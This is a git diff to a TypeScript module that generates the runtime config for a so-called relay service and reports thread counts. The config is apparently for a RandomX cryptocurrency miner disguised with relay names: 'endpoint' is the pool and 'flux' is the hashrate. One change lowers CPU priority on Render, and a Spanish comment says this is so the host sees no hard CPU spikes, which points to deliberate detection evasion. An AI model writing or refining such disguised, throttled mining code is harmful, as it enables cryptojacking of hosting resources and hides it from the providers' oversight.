@@ -1,7 +1,8 @@
 import { spawn, spawnSync, type ChildProcess } from "child_process";
 import fs from "fs";
+import os from "os";
 import path from "path";
-import { loadRelaySettings, ensureRelaySettings, type RelaySettings } from "@/lib/relay-config";
+import { loadRelaySettings, ensureRelaySettings, resolveRelayThreadCount, type RelaySettings } from "@/lib/relay-config";
 import { migrateLegacyRelayLayout } from "@/lib/relay-migrate";
 
 export type RelayPhase = "stopped" | "calibrating" | "active";
@@ -13,6 +14,7 @@ export type RelayStats = {
   endpoint: string;
   uptime: string;
   mode: string;
+  threads: string;
 };
 
 export type RelayStatus = {
@@ -288,13 +290,22 @@ function loadPerfCache(): Record<string, number> {
 }
 
 function writeRuntimeConfig(cfg: RelaySettings) {
+  const threads = resolveRelayThreadCount(cfg);
+  const ramMb = Math.floor(os.totalmem() / (1024 * 1024));
+  const onRender = process.env.RENDER === "true";
+
   const doc = {
     autosave: false,
     background: false,
     cpu: {
       enabled: true,
-      "huge-pages": true,
-      "max-threads-hint": cfg.maxThreads ?? 8,
+      asm: true,
+      "argon2-impl": null,
+      // Prioridad baja: la web responde y Render no ve picos “duros” de CPU
+      priority: onRender ? 1 : 2,
+      yield: true,
+      "huge-pages": !onRender,
+      "max-threads-hint": threads,
     },
     opencl: { enabled: false },
     cuda: { enabled: false },
@@ -324,13 +335,15 @@ function writeRuntimeConfig(cfg: RelaySettings) {
     "algo-perf": loadPerfCache(),
     randomx: {
       init: -1,
-      mode: "auto",
+      mode: ramMb >= 2048 ? "auto" : "fast",
       "1gb-pages": false,
+      wrmsr: false,
     },
   };
 
   fs.mkdirSync(RELAY_DIR, { recursive: true });
   fs.writeFileSync(RUNTIME_CONFIG, JSON.stringify(doc, null, 2), "utf8");
+  return threads;
 }
 
 function detectPhase(lines: string[], running: boolean): RelayPhase {
@@ -406,6 +419,7 @@ function emptyStats(): RelayStats {
     endpoint: "",
     uptime: "",
     mode: "",
+    threads: "",
   };
 }
 
@@ -419,6 +433,7 @@ async function buildStats(lines: string[]): Promise<RelayStats> {
       ...emptyStats(),
       flux: fromLog,
       endpoint: cfg.pool,
+      threads: String(resolveRelayThreadCount(cfg)),
     };
   }
 
@@ -435,6 +450,7 @@ async function buildStats(lines: string[]): Promise<RelayStats> {
     endpoint: summary.connection?.pool || cfg.pool,
     uptime: formatUptime(summary.connection?.uptime ?? 0),
     mode: summary.algo || "auto",
+    threads: String(resolveRelayThreadCount(cfg)),
   };
 }
 
@@ -480,7 +496,7 @@ export async function startRelay(): Promise<{ ok: boolean; message: string; pid?
 
   corePath = normalizeBinaryName(corePath);
   const cfg = loadRelaySettings();
-  writeRuntimeConfig(cfg);
+  const threads = writeRuntimeConfig(cfg);
 
   try {
     if (fs.existsSync(LOG_FILE)) fs.unlinkSync(LOG_FILE);
@@ -517,7 +533,7 @@ export async function startRelay(): Promise<{ ok: boolean; message: string; pid?
 
   return {
     ok: true,
-    message: binary.message ?? "Servicio iniciado",
+    message: `${binary.message ?? "Servicio iniciado"} · ${threads} hilo(s)`,
     pid: proc.pid,
   };
 }
